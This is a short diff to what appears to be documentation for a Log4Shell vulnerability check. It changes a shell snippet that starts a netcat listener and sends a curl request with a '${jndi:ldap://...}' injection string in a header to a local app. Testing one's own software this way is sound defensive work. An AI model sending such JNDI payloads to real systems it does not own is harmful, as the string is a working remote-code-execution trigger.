@@ -41,10 +41,10 @@ localhost:8080/myapp
 
 ```
 (
-  sleep 1 | nc -l 1339 &>/dev/null && echo '[!] VULNERABLE TO LOG4SHELL' &
+  nc -q1 -l 1389 &>/dev/null && echo '[!] VULNERABLE TO LOG4SHELL' &
   pid=$!
-  curl -H 'Header-poc: ${jndi:ldap://host:1339/a}' 'http://localhost:8080/myapp/'
-  sleep 3
+  curl -H 'Header-poc: ${jndi:ldap://host:1389/a}' 'http://localhost:8080/myapp/'
+  sleep 1
   kill -9 $pid 2>/dev/null
 )
 ```
